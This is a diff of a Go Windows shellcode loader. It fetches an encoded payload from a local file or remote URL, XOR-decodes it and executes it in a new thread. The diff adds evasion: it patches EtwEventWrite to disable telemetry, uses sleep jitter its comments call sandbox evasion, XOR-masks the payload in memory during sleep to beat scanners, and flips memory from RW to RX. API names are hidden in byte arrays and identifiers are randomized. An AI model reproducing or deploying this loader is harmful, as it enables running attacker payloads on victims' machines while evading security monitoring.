@@ -15,127 +15,152 @@ import (
 )
 
 var (
-	qrglmdas5 = windows.NewLazySystemDLL(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
-	sjcvttkk = windows.NewLazySystemDLL(string([]byte{110,116,100,108,108,46,100,108,108}))
+	oi4qhmucu03t = windows.NewLazySystemDLL(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
+	z68yf5o1cn8zd = windows.NewLazySystemDLL(string([]byte{110,116,100,108,108,46,100,108,108}))
 
-	prochtxumf3z245lw = sjcvttkk.NewProc(string([]byte{82,116,108,77,111,118}) + string([]byte{101,77,101,109,111,114,121}))
+	proct4nnocwe94cau = z68yf5o1cn8zd.NewProc(string([]byte{82}) + string([]byte{116,108,77,111,118,101,77,101}) + string([]byte{109,111,114,121}))
 )
 
-func yiqb70m() int {
-	ch := make(chan int, 1)
-	ch <- 738
-	return <-ch
-}
-
-func iu9ldrabb() int {
+func gxmpi5hc1ngc() int {
 	x := 0
-	for i := 0; i < 47; i++ {
-		x += i * 4
+	for i := 0; i < 59; i++ {
+		x += i * 9
 	}
 	return x
 }
 
-func q4s4hqm2v() []int {
-	s := make([]int, 6)
-	for i := range s {
-		s[i] = i * 7 + 35
-	}
-	return s
+func r10w4f1g() int {
+	ch := make(chan int, 1)
+	ch <- 316
+	return <-ch
 }
 
-func zst2f22f2bpo(err error, msg string) {
+func utyo0wrh() bool {
+	return 817 > 371
+}
+
+func a6nzgs6() string {
+	b := make([]byte, 19)
+	for i := range b {
+		b[i] = byte(76 + (i % 7))
+	}
+	return string(b)
+}
+
+func dl7wn09jf24e(err error, msg string) {
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
 		os.Exit(1)
 	}
 }
 
-func bre3ry6ufuja() {
-	ia6e2kc5v4y := sjcvttkk.NewProc(string([]byte{69,116,119,69,118,101,110,116,87,114,105}) + string([]byte{116,101}))
-	ia6e2kc5v4y.Find()
+func ig8dkvx() {
+	g7egcntz4nj := z68yf5o1cn8zd.NewProc(string([]byte{69,116,119,69,118,101,110,116,87,114,105,116}) + string([]byte{101}))
+	g7egcntz4nj.Find()
 	patch := []byte{0xC3}
-	var n5g1e6l uint32
-	vp := qrglmdas5.NewProc(string([]byte{86,105}) + string([]byte{114,116}) + string([]byte{117,97}) + string([]byte{108,80,114,111,116,101,99,116}))
-	vp.Call(ia6e2kc5v4y.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&n5g1e6l)))
-	*(*byte)(unsafe.Pointer(ia6e2kc5v4y.Addr())) = patch[0]
-	vp.Call(ia6e2kc5v4y.Addr(), 1, uintptr(n5g1e6l), uintptr(unsafe.Pointer(&n5g1e6l)))
+	var qj21r1v7fwp6o uint32
+	vp := oi4qhmucu03t.NewProc(string([]byte{86,105}) + string([]byte{114,116,117,97,108}) + string([]byte{80,114,111,116,101,99}) + string([]byte{116}))
+	vp.Call(g7egcntz4nj.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&qj21r1v7fwp6o)))
+	*(*byte)(unsafe.Pointer(g7egcntz4nj.Addr())) = patch[0]
+	vp.Call(g7egcntz4nj.Addr(), 1, uintptr(qj21r1v7fwp6o), uintptr(unsafe.Pointer(&qj21r1v7fwp6o)))
 }
 
-func b6ha7gl1g9031(url string) []byte {
-	zfsgoxtma := &http.Client{}
-	zgenvc7i47b, err := zfsgoxtma.Get(url)
-	zst2f22f2bpo(err, "download failed")
-	defer zgenvc7i47b.Body.Close()
-	data, err := io.ReadAll(zgenvc7i47b.Body)
-	zst2f22f2bpo(err, "read failed")
+func k3go88q9dd(url string) []byte {
+	totaozmtu := &http.Client{}
+	w8tkubb, err := totaozmtu.Get(url)
+	dl7wn09jf24e(err, "download failed")
+	defer w8tkubb.Body.Close()
+	data, err := io.ReadAll(w8tkubb.Body)
+	dl7wn09jf24e(err, "read failed")
 	return data
 }
 
-func umslt2w969g(p string) []byte {
+func fd28812j80myy(p string) []byte {
 	data, err := os.ReadFile(p)
-	zst2f22f2bpo(err, "load failed")
+	dl7wn09jf24e(err, "load failed")
 	return data
 }
 
-func cvtby5xcm6l(data []byte) []byte {
+func xm80mfxx4ktrc(data []byte) []byte {
 	decoded, err := base64.StdEncoding.DecodeString(string(data))
-	zst2f22f2bpo(err, "decode failed")
-	return decoded
+	dl7wn09jf24e(err, "decode failed")
+	if len(decoded) < 2 {
+		fmt.Fprintf(os.Stderr, "[!] payload invalid\n")
+		os.Exit(1)
+	}
+	// First byte is XOR key; remaining bytes are XOR-encrypted shellcode.
+	v30qg7y41j := decoded[0]
+	sc := make([]byte, len(decoded)-1)
+	for i, b := range decoded[1:] {
+		sc[i] = b ^ v30qg7y41j
+	}
+	return sc
 }
 
-func fiz6q53nccp(ibdsohh99 []byte) {
-	bre3ry6ufuja()
+func vqjn1ke4czvf0(pt4x7nj4 []byte) {
+	ig8dkvx()
 
 	// Timing jitter — sandbox evasion
-	hlpx8dpgrqe := time.Duration(rand.Intn(800)+200) * time.Millisecond
-	time.Sleep(hlpx8dpgrqe)
+	rz8in2k := time.Duration(rand.Intn(800)+200) * time.Millisecond
+	time.Sleep(rz8in2k)
 
 	// VirtualAlloc PAGE_READWRITE (no RWX signature)
-	hlqpcl46en9rf, err := windows.VirtualAlloc(
+	dldk37a, err := windows.VirtualAlloc(
 		0,
-		uintptr(len(ibdsohh99)),
+		uintptr(len(pt4x7nj4)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_READWRITE,
 	)
-	zst2f22f2bpo(err, "VirtualAlloc failed")
+	dl7wn09jf24e(err, "VirtualAlloc failed")
 
 	// Copy shellcode into RW region
-	prochtxumf3z245lw.Call(
-		hlqpcl46en9rf,
-		uintptr(unsafe.Pointer(&ibdsohh99[0])),
-		uintptr(len(ibdsohh99)),
+	proct4nnocwe94cau.Call(
+		dldk37a,
+		uintptr(unsafe.Pointer(&pt4x7nj4[0])),
+		uintptr(len(pt4x7nj4)),
 	)
 
+	// XOR-encrypt shellcode in RW memory while sleeping.
+	// Defeats MARS time-based memory scans — no recognisable bytes at rest.
+	s8ubzea := byte(rand.Intn(254) + 1)
+	for i := 0; i < len(pt4x7nj4); i++ {
+		*(*byte)(unsafe.Pointer(dldk37a + uintptr(i))) ^= s8ubzea
+	}
+	time.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)
+	for i := 0; i < len(pt4x7nj4); i++ {
+		*(*byte)(unsafe.Pointer(dldk37a + uintptr(i))) ^= s8ubzea
+	}
+
 	// Flip to RX (execute, no write) — avoids RWX detection
-	var n5g1e6l uint32
-	vp := qrglmdas5.NewProc(string([]byte{86,105}) + string([]byte{114,116}) + string([]byte{117,97}) + string([]byte{108,80,114,111,116,101,99,116}))
-	vp.Call(hlqpcl46en9rf, uintptr(len(ibdsohh99)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&n5g1e6l)))
+	var qj21r1v7fwp6o uint32
+	vp := oi4qhmucu03t.NewProc(string([]byte{86,105}) + string([]byte{114,116,117,97,108}) + string([]byte{80,114,111,116,101,99}) + string([]byte{116}))
+	vp.Call(dldk37a, uintptr(len(pt4x7nj4)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&qj21r1v7fwp6o)))
 
 	// CreateThread with 32MB stack + WaitForSingleObject
-	m1bnuqpzj7x, _, err := qrglmdas5.NewProc(string([]byte{67,114,101}) + string([]byte{97,116,101,84,104,114,101,97,100})).Call(0, 33554432, hlqpcl46en9rf, 0, 0x00010000, 0)
-	if m1bnuqpzj7x == 0 {
-		zst2f22f2bpo(err, "CreateThread failed")
+	ukl0afhhoe, _, err := oi4qhmucu03t.NewProc(string([]byte{67,114,101}) + string([]byte{97,116}) + string([]byte{101,84,104,114,101,97,100})).Call(0, 33554432, dldk37a, 0, 0x00010000, 0)
+	if ukl0afhhoe == 0 {
+		dl7wn09jf24e(err, "CreateThread failed")
 	}
-	qrglmdas5.NewProc(string([]byte{87}) + string([]byte{97,105,116,70,111,114,83,105,110}) + string([]byte{103,108,101}) + string([]byte{79,98,106,101,99,116})).Call(m1bnuqpzj7x, 0xFFFFFFFF)
+	oi4qhmucu03t.NewProc(string([]byte{87,97,105,116,70,111,114,83,105,110,103,108,101,79,98}) + string([]byte{106,101,99,116})).Call(ukl0afhhoe, 0xFFFFFFFF)
 }
 
 func main() {
-	cj3pkkf4tmj4n := flag.String("local", "", "Path to local base64-encoded shellcode file")
-	kpjq55f92hsu := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
+	ywlosotffo1q := flag.String("local", "", "Path to local base64-encoded shellcode file")
+	o60rnhn := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
 	flag.Parse()
 
-	var sb7sow1p0 []byte
+	var oh4trzinccjl4 []byte
 
-	if *cj3pkkf4tmj4n != "" {
-		sb7sow1p0 = umslt2w969g(*cj3pkkf4tmj4n)
-	} else if *kpjq55f92hsu != "" {
-		sb7sow1p0 = b6ha7gl1g9031(*kpjq55f92hsu)
+	if *ywlosotffo1q != "" {
+		oh4trzinccjl4 = fd28812j80myy(*ywlosotffo1q)
+	} else if *o60rnhn != "" {
+		oh4trzinccjl4 = k3go88q9dd(*o60rnhn)
 	} else {
 		fmt.Println("[!] Usage: -local <path> | -remote <url>")
 		os.Exit(1)
 	}
 
-	ck12tis := cvtby5xcm6l(sb7sow1p0)
+	odju0thg6q797 := xm80mfxx4ktrc(oh4trzinccjl4)
 	fmt.Println("[+] Shellcode decoded. Executing...")
-	fiz6q53nccp(ck12tis)
+	vqjn1ke4czvf0(odju0thg6q797)
 }
